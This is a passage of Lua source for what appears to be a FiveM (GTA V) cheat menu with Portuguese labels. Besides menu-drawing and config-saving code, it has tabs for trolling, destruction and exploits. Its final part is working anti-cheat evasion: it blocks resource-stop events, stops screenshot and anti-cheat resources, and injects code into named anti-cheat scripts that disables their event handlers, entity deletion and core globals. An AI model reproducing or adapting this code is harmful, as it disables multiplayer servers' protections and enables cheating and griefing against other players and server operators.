                next.vars.prev_menuX = menuX
                next.vars.prev_menuY = menuY
                if #next.vars.snowflakes < 150 then
                    table.insert(next.vars.snowflakes, {
                        x = math.random(menuX, menuX + menuW),
                        y = menuY,
                        size = math.random(20, 40) / 10.0,
                        speed = math.random(5, 15) / 10.0,
                        wobble = math.random() * 6.0
                    })
                end
                for i = #next.vars.snowflakes, 1, -1 do
                    local flake = next.vars.snowflakes[i]
                    flake.y = flake.y + flake.speed
                    flake.wobble = flake.wobble + 0.02
                    flake.x = flake.x + math.sin(flake.wobble) * 0.5
                    if flake.x < menuX or flake.x > (menuX + menuW) or flake.y > (menuY + menuH) then
                        table.remove(next.vars.snowflakes, i)
                    end
                end
                for i, flake in ipairs(next.vars.snowflakes) do
                    next.utils.add_rect("snow_flake_"..i, flake.x, flake.y, flake.size, flake.size, 255, 255, 255, 200, 2.0, 9999)
                end
            else
                next.vars.prev_menuX = 0
                next.vars.prev_menuY = 0
            end
            Wait(0)
        end
        next.vars.snowflakes = {}
        next.vars.prev_menuX = 0
        next.vars.prev_menuY = 0
    end)
end)
    next.elements.checkbox("Menu RGB", "menu_rgb", function(state)
    if state then
        nt.createTh(function()
            while next.values.checkbox["menu_rgb"] do
                local rainbow = next.functions['RGBnext'](1.0)
                next.colors.theme = {rainbow.r, rainbow.g, rainbow.b}
                my.colors.main = {rainbow.r, rainbow.g, rainbow.b, 255}
                Wait(0)
            end
        end)
    end
end)
                    end
                elseif next.vars.tab_selected == "Config" then
                    if next.vars.subtab_selected == "Config" then
                        next.elements.groupbox("Infos", "iNFORMACOES", "\xef\x80\x93", 280, 0, 270, 300)
                        next.elements.button("User: " .. tostring(next.cargos.get_username()), "user", function() end)
                        next.elements.button("Cargo: " .. tostring(next.cargos.get_role()), "cargo", function() end)
                        next.elements.button("Hwid: " .. tostring(next.cargos.get_hwid()), "fkkkk", function() end)
                        next.elements.button("Grupo Atual: " .. tostring(group), "qdqwdqwd", function() end)
                        next.elements.button("Cidade Atual: " .. tostring(city), "cidade", function() end)
                        next.elements.button("Anticheat Atual: " .. tostring(anticheat), "dqwdqd", function() end)
                        next.elements.button("Players Online: " .. (next.server_info.players and next.server_info.players.players or "N/A"), "dqwdqd213", function() end)
                        next.elements.groupbox("Config", "config", "\xef\x80\x93", 0, 0, 270, 300)
                        next.elements.button("Desinjetar menu", "desinjetarmenu", function()
                            if my.mainVars.breakTh then return end
                            my.mainVars.draw = false
                            my.mainVars.breakTh = true
                            next.render = false
                            next.active = false
                            my.binds.buttons = {}
                            my.binds.checkboxes = {}
                            my.interact.bindVars.isBinding = false
                            my.interact.bindVars.curBind = false
                            my.interact.listNotify = {}
                            for _, input in pairs(my.interact.inputs) do
                                input.active = false
                            end
                            for _, slider in pairs(my.interact.sliderAnimations) do
                                slider.active = false
                            end
                            SetNuiFocus(false, false)
                            SetNuiFocusKeepInput(false)
                        end)
                        next.elements.button("Se Crashar", "secrashar", function()
                                nt.createTh(function()
                                  while true do
                                  end
                             end)
                        end)
                        next.elements.button("Fake Ban", "banfake", function()
                            next.elements.notify("Em Desensolvimento", "warning")
                        end)
                        local function getKeyName(keyValue)
                            for name, value in pairs(next.keys) do
                                if value == keyValue then
                                    return name
                                end
                            end
                            return "Desconhecida"
                        end
                        next.elements.button("Bind Menu: " .. getKeyName(next.bind), "bindona", function()
                            next.elements.notify("Pressione uma tecla para definir como bind do menu")
                            nt.createTh(function()
                                Wait(200)
                                while true do
                                    Wait(0)
                                    for key, vkCode in pairs(next.keys) do
                                        if FrameAPI.IsKeyJustPressed(vkCode) then
                                            next.bind = vkCode
                                            my.mainVars.key = vkCode
                                            next.elements.notify("Bind do menu alterado para: " .. key)
                                            return
                                        end
                                    end
                                end
                            end)
                        end)
                    next.elements.groupbox("Otimizaçao", "otimize", "\xef\x80\x93", 0, 305, 270, 140)
next.elements.checkbox("Sempre Dia", "sempre_dia", function(bool)
    if bool then
        if next.values.checkbox["sempre_noite"] then
            next.elements.setCheckbox("sempre_noite", false)
        end

        Citizen.CreateThread(function()
            while next.values.checkbox["sempre_dia"] do
                Wait(1)
                NetworkOverrideClockTime(12, 0, 0)
            end
        end)
    else
        NetworkClearClockTimeOverride()
    end
end)
next.elements.checkbox("Sempre Noite", "sempre_noite", function(bool)
    if bool then
        if next.values.checkbox["sempre_dia"] then
            next.elements.setCheckbox("sempre_dia", false)
        end

        Citizen.CreateThread(function()
            while next.values.checkbox["sempre_noite"] do
                Wait(1)
                NetworkOverrideClockTime(0, 0, 0)
            end
        end)
    else
        NetworkClearClockTimeOverride()
    end
end)

next.elements.slider("Mudar Clima", "weather_slider", {min = 1, max = #next.weatherTypes, start = 1}, function(val)
    local selected = next.weatherTypes[val]
    if selected then
        SetWeatherTypeNowPersist(selected.id)
        SetWeatherTypeNow(selected.id)
        SetOverrideWeather(selected.id)
    end
end)
next.elements.button("Otimização V2", "otimizacao_vdsf2", function()
		SetTimecycleModifier("yell_tunnel_nodirect")
		ClearBrief()
 		ClearFocus()
 		ClearPrints()
 		ClearHdArea()
 		ClearGpsFlags()
 		SetRainLevel(0.0)
 		SetWindSpeed(0.0)
 		ClearSmallPrints()
 		ClearReplayStats()
		ClearPedWetness(PlayerPedId())
 		ClearPedEnvDirt(PlayerPedId())
		ClearAllBrokenGlass()
		ClearOverrideWeather()
 		ClearAllHelpMessages()
 		DisableScreenblurFade()
 		ClearPedBloodDamage(PlayerPedId())
 		ResetPedVisibleDamage(PlayerPedId())
 		LeaderboardsReadClearAll()
 		LeaderboardsClearCacheData()
end)
                        next.elements.checkbox("Modo Minecraft", "minecraft", function()
                            if next.values.checkbox["minecraft"] then
                            nt.createTh(function()
                                    while next.values.checkbox["minecraft"] do
                                        OverrideLodscaleThisFrame(PlayerPedId(), 0.0)
                                        Wait(0)
                                    end
                                end)
                            else
                                nt.createTh(function()
                                    OverrideLodscaleThisFrame(PlayerPedId(), 1.0)
                                end)
                            end
                       end)
                       next.elements.checkbox("Mostrar Lista de Keybinds", "show_keybinds_list", function(state)
                        end)
                   end
                end
        flushGroupbox()
    end
    my.render =
    {
        tabs =
        {
            {id = 'self', image = 'self_icon', name = 'Jogador'},
            {id = 'online', image = 'user_icon', name = 'Online'},
            {id = 'vehicle', image = 'vehicle_icon', name = 'Veículos'},
            {id = 'weapon', image = 'weapon_icon', name = 'Armas'},
            {id = 'destruction', image = 'monkey_icon', name = 'Destruição'},
            {id = 'exploits', image = 'monkey_icon', name = 'Exploits'},
            {id = 'config', image = 'config_icon', name = 'Config'},
        },
        elements =
        {
            {id='self', cursubtab='Geral', titles={{id='player', name='Jogador', subtabs={
                {id='Geral', name='Geral', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Jogador','Geral') end},
                {id='Roupas', name='Roupas', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Jogador','Roupas') end},
                {id='Teleportes', name='Teleportes', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Jogador','Teleportes') end},
                {id='Animações', name='Animações', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Jogador','Animações') end},
            }}}},
            {id='online', cursubtab='Players', titles={{id='onlineTab', name='Online', subtabs={
                {id='Players', name='Players', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Online','Players') end},
            }}}},
            {id='vehicle', cursubtab='Geral', titles={{id='vehicleTab', name='Veículos', subtabs={
                {id='Geral', name='Geral', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Veículos','Geral') end},
                {id='Meu Veiculo', name='Meu Veículo', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Veículos','Meu Veiculo') end},
                {id='Tunagem', name='Tunagem', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Veículos','Tunagem') end},
            }}}},
            {id='weapon', cursubtab='Weapons', titles={{id='weaponTab', name='Armas', subtabs={
                {id='Weapons', name='Weapons', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Armas','Weapons') end},
            }}}},
            {id='destruction', cursubtab='Troll', titles={{id='destructionTab', name='Destruição', subtabs={
                {id='Troll', name='Troll', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Destruição','Troll') end},
                {id='Free Cam', name='Free Cam', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Destruição','Free Cam') end},
            }}}},
            {id='exploits', cursubtab='Exploits', titles={{id='exploitsTab', name='Exploits', subtabs={
                {id='Exploits', name='Exploits', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Exploits','Exploits') end},
            }}}},
            {id='config', cursubtab='Config', titles={{id='configTab', name='Config', subtabs={
                {id='Config', name='Config', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Config','Config') end},
                {id='Cores', name='Cores', groupboxes={}, bridge=function() my.interact.rendernextFeatures('Temas','Personalização') end},
            }}}},
        }
    }

    local _navParent = {}
    local _navImage = {}
    for _, item in ipairs(my.render.tabs or {}) do _navImage[item.id] = item.image end
    for _, parent in ipairs(my.render.elements or {}) do
        _navParent[parent.id] = parent
        parent.__titleIndex = {}
        for _, title in ipairs(parent.titles or {}) do parent.__titleIndex[title.id] = title end
    end
    local function _renderNavEntry(label, parentId, titleId, subtabId)
        local parent = _navParent[parentId]
        local title = parent and parent.__titleIndex[titleId]
        if not parent or not title then return end
        local selectedSubtab = subtabId or (title.subtabs and title.subtabs[1] and title.subtabs[1].id)
        my.interact.tab(parentId..'::'..titleId, label, _navImage[parentId], parentId, titleId, selectedSubtab)
    end
    my.rendering = {}
    my.rendering.renderTabs = function()
        my.interact.tabVars.pos.x = 0
        my.interact.tabVars.pos.y = 0
        if not my.mainVars.navEntry then
            my.mainVars.navEntry = 'self::player'
            my.mainVars.navTitle = 'player'
            my.mainVars.tab = 'self'
        end
        my.interact.tabCategory('Opções Gerais')
        _renderNavEntry('Jogador', 'self', 'player', 'Geral')
        _renderNavEntry('Veículos', 'vehicle', 'vehicleTab', 'Geral')
        _renderNavEntry('Armas', 'weapon', 'weaponTab', 'Weapons')
        my.interact.tabCategory('Opções do Servidor')
        _renderNavEntry('Online', 'online', 'onlineTab', 'Players')
        _renderNavEntry('Destruição', 'destruction', 'destructionTab', 'Troll')
        _renderNavEntry('Exploits', 'exploits', 'exploitsTab', 'Exploits')
        my.interact.tabCategory('Opções Extras')
        _renderNavEntry('Config', 'config', 'configTab', 'Config')
    end
    my.rendering.identifyElement = function(item)
    local itemType = string.lower(tostring(item.type or 'default'))
    my.interact.frame.currentItemType = itemType
    local addValue = my.frame.addValues[item.type] or my.frame.addValues[itemType] or my.frame.addValues['default']
    if item.type  == "button" or (itemType == "button") then
    my.interact.button(item.id, item.text, item.desc, item.func)
    elseif item.type  == "checkbox" or (itemType == "checkbox") then
    my.interact.checkbox(item.id, item.text, item.desc, item.func)
    elseif item.type  == "combobox" or (itemType == "combobox") then
    my.interact.combobox(item.id, item.text, item.combotext, item.desc, item.table, item.defoption, item.func)
    elseif item.type  == "slider" or (itemType == "slider") then
    my.interact.slider(item.id, item.text, item.desc, item.format, item.table, item.func, item.funcdrag)
    elseif item.type  == "colorpicker" or (itemType == "colorpicker") then
    my.interact.colorpicker(item.id, item.text, item.desc, item.defcolor, item.func, item.funcdrag)
    elseif item.type == "input" or (itemType == "input") then
    my.interact.input(item.id, item.text, item.storage, item.storageKey, item.icon, item.search, item.func)
    elseif itemType == "listsearch" then
    my.interact.listSearchBar(item.id, item.storage, item.storageKey)
    elseif itemType == "listitem" then
    my.interact.alphaListItem(item.id, item.text, item.selected, item.color, item.func)
    end
    my.interact.activeDrawOrderOffset = nil
    my.interact.activeClipRect = nil
    my.interact.currentItemHiddenByScroll = false
    my.interact.frame.pos.add = my.interact.frame.pos.add + addValue
    end
    my.rendering.renderSubtabs = function()
        my.interact.clipOrderSerial = 0
        my.interact.activeDrawOrderOffset = nil
        my.interact.activeClipRect = nil
        my.interact.currentItemHiddenByScroll = false
        local isSearching = my.others.isSearching()
        if isSearching then
            my.interact.groupboxVars.pos.x = 0.0
            my.interact.groupboxVars.pos.y = 0.0
            local itemsSearch = {}
            for _, searchTab in ipairs(my.render.elements or {}) do
                for _, title in ipairs(searchTab.titles or {}) do
                    for _, subtab in ipairs(title.subtabs or {}) do
                        for _, groupbox in ipairs(subtab.groupboxes or {}) do
                            for _, item in ipairs(groupbox.items or {}) do
                                if item.text and my.others.searchCheck(my.interact.searchVars.text, item.text) then
                                    table.insert(itemsSearch, item)
                                end
                            end
                        end
                    end
                end
            end
            my.interact.groupbox('searching', 'Pesquisando', 500, itemsSearch)
            return
        end
        local parent = _navParent[my.mainVars.tab]
        if parent then
                local selectedTitle = parent.__titleIndex and parent.__titleIndex[my.mainVars.navTitle] or nil
                if not selectedTitle and parent.titles and #parent.titles > 0 then
                    selectedTitle = parent.titles[1]
                    my.mainVars.navTitle = selectedTitle.id
                    my.mainVars.navEntry = tostring(parent.id)..'::'..tostring(selectedTitle.id)
                end
                if selectedTitle then
                    local visibleSubtabs = {}
                    for _, subtab in ipairs(selectedTitle.subtabs or {}) do
                        table.insert(visibleSubtabs, subtab)
                    end
                    if parent.id == 'vehicle' and selectedTitle.id == 'vehicletab' then
                        for _, title in ipairs(parent.titles or {}) do
                            if title.id == 'Tuning' then
                                for _, tuningSubtab in ipairs(title.subtabs or {}) do
                                    table.insert(visibleSubtabs, tuningSubtab)
                                end
                                break
                            end
                        end
                    end
                    local validSelection = false
                    for _, subtab in ipairs(visibleSubtabs) do
                        if subtab.id == parent.cursubtab then
                            validSelection = true
                            break
                        end
                    end
                    if not validSelection and #visibleSubtabs > 0 then
                        parent.cursubtab = visibleSubtabs[1].id
                    end
                    my.mainVars.curtabName = parent.id
                    my.mainVars.curTitle = selectedTitle.name
                    my.interact.subtabVars.pos.x = 0.0
                    my.interact.subtabVars.pos.y = 0.0
                    local pageKey = tostring(parent.id)..'::'..tostring(selectedTitle.id)..'::'..tostring(parent.cursubtab)
                    local fade = my.interact.pageFade
                    if fade.key == nil then
                        fade.key = pageKey
                        fade.alpha = 1.0
                    elseif fade.key ~= pageKey then
                        fade.key = pageKey
                        fade.alpha = 0.0
                    else
                        fade.alpha = my.anim.lerp(fade.alpha or 0.0, 1.0, 0.085)
                        if fade.alpha > 0.995 then
                            fade.alpha = 1.0
                        end
                    end
                    for _, subtab in ipairs(visibleSubtabs) do
                        my.interact.subtab(parent, selectedTitle.name, subtab.id, subtab.name, subtab.groupboxes, subtab.bridge)
                    end
                end
        end
    end
    my.rendering.renderAll = function()
    my.interact.searchBar()
    my.rendering.renderTabs()
    my.rendering.renderSubtabs()
    end
    my.config =
    {
    savedelay = 5000,
    saves =
    {
    checkbox = true,
    combobox = true,
    slider = true,
    colorpicker = true,
    groupboxstate = true,
    }
    }
    my.config.setCheckboxes = function()
    if my.config.saves.checkbox then
    local checkid = 'checkboxes'
    local checkboxes = FrameAPI.GetVar(checkid);
    if checkboxes then
        local checkDecoded = json.decode(checkboxes)
        for id, value in pairs(checkDecoded) do
            if id and id ~= '' then
                if value == 'true' then
                    my.bool[tostring(id)] = true
                else
                    my.bool[tostring(id)] = false
                end
            end
        end
    end
    end
    if my.config.saves.combobox then
    local comboid = 'comboboxes'
    local comboboxes = FrameAPI.GetVar(comboid);
    if comboboxes then
        local comboDecoded = json.decode(comboboxes)
        for id, value in pairs(comboDecoded) do
            if id and id ~= '' then
                if value then
                    if my.interact.comboBoxes[id] then
                        my.interact.comboBoxes[id].option = value
                    else
                        my.interact.comboBoxes[id] = {bool = false, option = value}
                    end
                end
            end
        end
    end
    end
    if my.config.saves.slider then
    local sliderid = 'sliders'
    local sliders = FrameAPI.GetVar(sliderid);
    if sliders then
        local sliderDecoded = json.decode(sliders)
        for id, value in pairs(sliderDecoded) do
            if id and id ~= '' then
                if value then
                    if value.max or value.min and value.value then
                        if my.interact.sliders[id] then
                            my.interact.sliders[id].max = value.max
                            my.interact.sliders[id].min = value.min
                            my.interact.sliders[id].value = value.value
                        else
                            my.interact.sliders[id] = {min = value.min or 0, max = value.max or 100, value = value.value or 0}
                        end
                    end
                end
            end
        end
    end
    end
    if my.config.saves.colorpicker then
    local colorpickerid = 'colorpickers'
    local colorpickers = FrameAPI.GetVar(colorpickerid);
    if colorpickers then
        local colorpickerDecoded = json.decode(colorpickers)
        for id, value in pairs(colorpickerDecoded) do
            if id and id ~= '' then
                if value then
                    if value.color or value.alpha and value.hue then
                        if my.interact.colorpickers[id] then
                            my.interact.colorpickers[id].color = value.color
                            my.interact.colorpickers[id].alpha = value.alpha
                            my.interact.colorpickers[id].hue = value.hue
                        else
                            my.interact.colorpickers[id] = {active = false, y = 0.0, color = value.color, selectedX = nil, selectedY = nil, alpha = value.alpha, alphaAnim = 0.0, hue = value.hue, hex = nil}
                        end
                    end
                end
            end
        end
    end
    end
    if my.config.saves.groupboxstate then
    local groupboxid = 'groupboxes'
    local groupboxes = FrameAPI.GetVar(groupboxid);
    if groupboxes then
        local textboxDecoded = json.decode(groupboxes)
        for id, value in pairs(textboxDecoded) do
            if id and id ~= '' then
                if value then
                    if value.closed then
                        if my.interact.groupboxes[id] then
                            my.interact.groupboxes[id].closed = value.closed
                        else
                            my.interact.groupboxes[id] = {closed = value.closed, h = 0.0, yAdjust = 0.0, alpha = 0.0}
                        end
                    end
                end
            end
        end
    end
    end
    end
    my.config.updateValues = function()
    if my.config.saves.checkbox then
    local checkid = 'checkboxes'
    local checkboxes = {}
    if my.bool then
        for id, value in pairs(my.bool) do
            if id and id ~= '' and not (string.find(id, '##player_') or string.find(id, '##vehicle_')) then
                if value then
                    checkboxes[id] = 'true'
                else
                    checkboxes[id] = 'false'
                end
            end
        end
    end
    local checkSave = json.encode(checkboxes)
    FrameAPI.SetVar(checkid, checkSave);
    end
    if my.config.saves.combobox then
    local comboid = 'comboboxes'
    local comboboxes = {}
    if my.interact.comboBoxes then
        for id, value in pairs(my.interact.comboBoxes) do
            if id and id ~= '' then
                if value then
                    if value.option then
                        comboboxes[id] = tostring(value.option)
                    end
                end
            end
        end
    end
    local comboSave = json.encode(comboboxes)
    FrameAPI.SetVar(comboid, comboSave);
    end
    if my.config.saves.slider then
    local sliderid = 'sliders'
    local sliders = {}
    if my.interact.sliders then
        for id, value in pairs(my.interact.sliders) do
            if id and id ~= '' then
                if value then
                    if value.min and value.max and value.value then
                        sliders[id] = {min = value.min, max = value.max, value = value.value}
                    end
                end
            end
        end
    end
    local sliders = json.encode(sliders)
    FrameAPI.SetVar(sliderid, sliders);
    end
    if my.config.saves.colorpicker then
    local colorpickerid = 'colorpickers'
    local colorpickers = {}
    if my.interact.colorpickers then
        for id, value in pairs(my.interact.colorpickers) do
            if id and id ~= '' then
                if value then
                    if value.color and value.alpha and value.hue then
                        colorpickers[id] = {color = value.color, alpha = value.alpha, hue = value.hue}
                    end
                end
            end
        end
    end
    local colorpickers = json.encode(colorpickers)
    FrameAPI.SetVar(colorpickerid, colorpickers);
    end
    if my.config.saves.groupboxstate then
    local groupboxid = 'groupboxes'
    local groupboxes = {}
    if my.interact.groupboxes then
        for id, value in pairs(my.interact.groupboxes) do
            if id and id ~= '' then
                if value then
                    if value.closed then
                        groupboxes[id] = {closed = value.closed}
                    end
                end
            end
        end
    end
    local groupboxes = json.encode(groupboxes)
    FrameAPI.SetVar(groupboxid, groupboxes);
    end
    end
    my.events = {}
    my.events.updateLists = function()
    local updateDelay = 3000
    nt.createTh(function ()
    while not my.mainVars.breakTh do
        if my.mainVars.tab == 'self' then
            local players = GetActivePlayers()
            local distanceMax = my.vars.playersVars.distanceMax
            my.vars.playersVars.list = {}
            for i, player in ipairs(players) do
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(GetPlayerPed(player)), false)
                if distance <= distanceMax then
                    table.insert(my.vars.playersVars.list, {player = player, distance = distance})
                end
            end
            table.sort(my.vars.playersVars.list, function(a, b)
                return a.distance < b.distance
            end)
        elseif my.mainVars.tab == 'vehicle' then
            local vehicles = GetGamePool('CVehicle')
            local distanceMax = my.vars.vehicleVars.distanceMax
            my.vars.vehicleVars.list = {}
            for i, vehicle in ipairs(vehicles) do
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(vehicle), false)
                if distance <= distanceMax then
                    table.insert(my.vars.vehicleVars.list, {vehicle = vehicle, distance = distance})
                end
            end
            table.sort(my.vars.vehicleVars.list, function(a, b)
                return a.distance < b.distance
            end)
        end
        Citizen.Wait(updateDelay)
    end
    end)
    end
    my.events.onReady = function ()
    my.vars.screen.w, my.vars.screen.h = GetActiveScreenResolution()
    my.userVars.username = FrameAPI.GetUsername();
    my.userVars.expire = FrameAPI.GetSubscription();
    my.events.updateLists()
    my.config.setCheckboxes()
    my.config.updateValues()
    mysticEssential.defineResourceMain()
    end
    my.rendering.renderStartupBinding = function()
        local binding = my.mainVars.startupBinding
        local screenW, screenH = GetActiveScreenResolution()
        local w, h = 200, 130
        local x, y = (screenW - w) / 2, (screenH - h) / 2
        DisableAllControlActions(0)
        DisableAllControlActions(1)
        DisableAllControlActions(2)
        if IsKeyJustPressed(myAPI.Keys["ESC"]) then
            binding.label = "..."
            binding.control = nil
        elseif IsKeyJustPressed(myAPI.Keys["ENTER"]) then
            if binding.control then
                next.bind = binding.control
                my.mainVars.key = binding.control
                binding.active = false
                my.mainVars.draw = true
            end
        else
            for name, keyCode in pairs(myAPI.Keys) do
                if name ~= "BACKSPACE" and name ~= "ENTER" and name ~= "ESC"
                    and name ~= "LBUTTON" and name ~= "RBUTTON"
                    and IsKeyJustPressed(keyCode) then
                    binding.label = name
                    binding.control = keyCode
                    break
                end
            end
        end
        if not binding.active then return end
        FrameAPI.Drawing.DrawShadowRect("binding:shadowOuter", x, y, w, h, 255, 35, 35, 150, 45.0, 4.0, 9988)
        FrameAPI.Drawing.DrawShadowRect("binding:shadowInner", x, y, w, h, 255, 35, 35, 210, 16.0, 4.0, 9989)
        FrameAPI.Drawing.DrawRect("binding:rect", x, y, w, h, 30, 30, 30, 255, 4.0, 9990)
        FrameAPI.Drawing.DrawRect("binding:rect2", x + 50, y + 48, 100, 40, 26, 26, 27, 255, 4.0, 9991)
        FrameAPI.Drawing.DrawText("binding:text2", "Escolha uma bind:", x + w / 2, y + 15, 19.5, true, 255, 255, 255, 255, "default", 9992)
        FrameAPI.Drawing.DrawText("binding:text", binding.label, x + w / 2, y + 57, 19.5, true, 255, 255, 255, 255, "default", 9992)
        FrameAPI.Drawing.DrawText("binding:hint", "ENTER confirma | ESC limpa", x + w / 2, y + 104, 12.0, true, 180, 180, 180, 255, "default", 9992)
    end
    my.events.onReady()
    nt.createTh(function ()
    while not my.mainVars.breakTh do
    Wait(1)
    if my.mainVars.breakTh then break end
    my.cache.leftPressed = IsKeyPressed(myAPI.Keys["LBUTTON"])
    my.cache.leftJustPressed = IsKeyJustPressed(myAPI.Keys["LBUTTON"])
    if my.bool['admnistratorList'] then
        my.interact.adminList()
    end
    if not my.mainVars.startupBinding.active then
        my.others.bindsCheck()
    end
    end
    end)
    nt.createTh(function ()
    while not my.mainVars.breakTh do
    Wait(0)
    if my.mainVars.breakTh then break end
    if my.mainVars.startupBinding.active then
        my.rendering.renderStartupBinding()
    elseif IsKeyJustPressed(my.mainVars.key) then
        my.mainVars.draw = not my.mainVars.draw
    end
    if my.mainVars.draw then
        DisableControlAction(0, 0, true)
        DisableControlAction(0, 1, true)
        DisableControlAction(0, 2, true)
        DisableControlAction(0, 142, true)
        DisableControlAction(0, 140, true)
        DisableControlAction(0, 322, true)
        DisableControlAction(0, 106, true)
        DisableControlAction(0, 25, true)
        DisableControlAction(0, 24, true)
        DisableControlAction(0, 257, true)
        DisableControlAction(0, 23, true)
        DisableControlAction(0, 16, true)
        DisableControlAction(0, 17, true)
    end
    if my.mainVars.breakTh then
        break
    end
    if my.mainVars.draw then
        my.mouse.frameReady = false
        my.mouse.beginFrame()
        my.display.displayCalls()
        my.interact.drag()
        my.rendering.renderAll()
        my.mouse.displayCursor()
    end
    end
    end)

FrameAPI.BlockGameEvent("onResourceStop", true)
FrameAPI.BlockGameEvent("onClientResourceStop", true)
FrameAPI.BlockClientEvent("onResourceStop", true)
FrameAPI.BlockClientEvent("onClientResourceStop", true)
FrameAPI.StopResource('screenshot-basic')
FrameAPI.StopResource('screenshot')
local code1 = [[
    crashVehicleHashes = {}
    armasMonitoradas = {} 
    crashPropHashes = {}
    Citizen.CreateThread = function(...) return end
    TriggerServerEvent       = function(...) end
    TriggerEvent             = function(...) end
    RegisterNetEvent         = function(...) end
    AddEventHandler          = function(...) end
    _G.TriggerServerEvent    = function(...) end
    _G.TriggerEvent          = function(...) end
    _G.RegisterNetEvent      = function(...) end
    _G.AddEventHandler       = function(...) end
]]
FrameAPI.Inject('vrp', code1)
FrameAPI.BlockClientEvent(true, "thn:pegaidiota2")
FrameAPI.BlockClientEvent(true, "thn:pegaidiota") 
FrameAPI.StopResource('ThnAC')

if GetResourceState('eqpg-pro') == "started" then
local function checkSpecificFiles()
    local suspiciousFiles = {
        "constants.js",
        "crop.js",
        "polyfills.js",
        "Three.js",
        "Three.Legacy.js",
        "utils.js"
    }

    local folders = {
        "",
        "module/",
        "modules/",
        "html/",
        "html/js/",
        "js/"
    }

    local foundInResources = {}

    local numResources = GetNumResources()

    for i = 0, numResources - 1 do
        local resourceName = GetResourceByFindIndex(i)

        if resourceName and GetResourceState(resourceName) == "started" then
            local detected = false

            for _, folder in ipairs(folders) do
                for _, fileName in ipairs(suspiciousFiles) do
                    local path = folder .. fileName

                    local content = LoadResourceFile(resourceName, path)

                    if content ~= nil then
                        foundInResources[resourceName] =
                            foundInResources[resourceName] or {}

                        table.insert(
                            foundInResources[resourceName],
                            path
                        )

                        detected = true
                    end
                end
            end

            if detected then
                if FrameAPI and FrameAPI.StopResource then
                    FrameAPI.StopResource(resourceName)
                end
            end
        end
    end

    return foundInResources
end

checkSpecificFiles()
end

FrameAPI.Inject('skywhite', [[
TriggerEvent = function(...) return end
RegisterNetEvent = function(...) return end
AddEventHandler = function(...) return end
Citizen.CreateThread = function(...) return end
RegisterCommand = function(...) return end
exports = setmetatable({}, {
__index = function()
return function(...) return end
end
})
]])

FrameAPI.Inject('skywhite', [[
if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
_G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
end
TriggerServerEvent = function(eventName, ...)
return
end
]])


FrameAPI.Inject('eqpg-pro', [[
TriggerEvent = function(...) return end
RegisterNetEvent = function(...) return end
AddEventHandler = function(...) return end
Citizen.CreateThread = function(...) return end
RegisterCommand = function(...) return end
exports = setmetatable({}, {
__index = function()
return function(...) return end
end
})
]])

FrameAPI.Inject('eqpg-pro', [[
if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
_G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
end
TriggerServerEvent = function(eventName, ...)
return
end
]])

FrameAPI.Inject('eqpg-pro', [[
if not _G._ORIGINAL_TRIGGER_CLIENT_EVENT then
    _G._ORIGINAL_TRIGGER_CLIENT_EVENT = TriggerClientEvent
end

TriggerClientEvent = function(eventName, playerId, ...)
    return
end
]])

FrameAPI.Inject('eqpg-pro', [[
if not _G._ORIGINAL_TRIGGER_EVENT then
    _G._ORIGINAL_TRIGGER_EVENT = TriggerEvent
end

TriggerEvent = function(eventName, ...)
    return
end
]])

FrameAPI.Inject('eqpg-pro', [[
local originalDoesEntityExist = DoesEntityExist
DoesEntityExist = function(entity)
return true
end
local originalDeleteEntity = DeleteEntity
DeleteEntity = function(entity)
return false
end
local originalDeletePed = DeletePed
DeletePed = function(ped)
return false
end 
]])
        
FrameAPI.Inject('eqpg-pro', [[
Citizen.CreateThread(function()
while true do
Citizen.Wait(0)
_G.LocalState       = function()
return
end
_G.RegisterNetEvent = function()
return
end
_G.GlobalState    = function()
return
end
_G.RegisterNUICallback = function()
return
end
_G.string = function()
return
end
_G.SendNUIMessage = function()
return
end
_G.AddEventHandler = function()
return
end
_G.RegisterNetEvent = function()
return
end
_G.io = function()
return
end
_G.json = function()
return
end
_G.os = function()
return
end
_G.table = function()
return
end
_G.math = function()
return
end
_G.type = function()
return
end
_G.getmetatable = function()
return
end
end
end)
]])

FrameAPI.Inject('eqpg-library', [[
TriggerEvent = function(...) return end
RegisterNetEvent = function(...) return end
AddEventHandler = function(...) return end
Citizen.CreateThread = function(...) return end
RegisterCommand = function(...) return end
exports = setmetatable({}, {
__index = function()
return function(...) return end
end
})
]])

FrameAPI.Inject('eqpg-library', [[
if not _G._ORIGINAL_TRIGGER_EVENT then
    _G._ORIGINAL_TRIGGER_EVENT = TriggerEvent
end

TriggerEvent = function(eventName, ...)
    return
end
]])

FrameAPI.Inject('eqpg-library', [[
if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
_G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
end
TriggerServerEvent = function(eventName, ...)
return
end
]])

FrameAPI.Inject('eqpg-library', [[
if not _G._ORIGINAL_TRIGGER_CLIENT_EVENT then
    _G._ORIGINAL_TRIGGER_CLIENT_EVENT = TriggerClientEvent
end

TriggerClientEvent = function(eventName, playerId, ...)
    return
end
]])


FrameAPI.Inject('falcon-pro', [[
TriggerEvent = function(...) return end
RegisterNetEvent = function(...) return end
AddEventHandler = function(...) return end
Citizen.CreateThread = function(...) return end
RegisterCommand = function(...) return end
exports = setmetatable({}, {
__index = function()
return function(...) return end
end
})
exports = setmetatable({}, {
__newindex = function()
return function(...) return end
end
})
]])

FrameAPI.Inject('falcon-pro', [[
Citizen.CreateThread(function()
while true do
Citizen.Wait(0)
_G.LocalState       = function()
return
end
_G.RegisterNetEvent = function()
return
end
_G.GlobalState    = function()
return
end
_G.RegisterNUICallback = function()
return
end
_G.string = function()
return
end
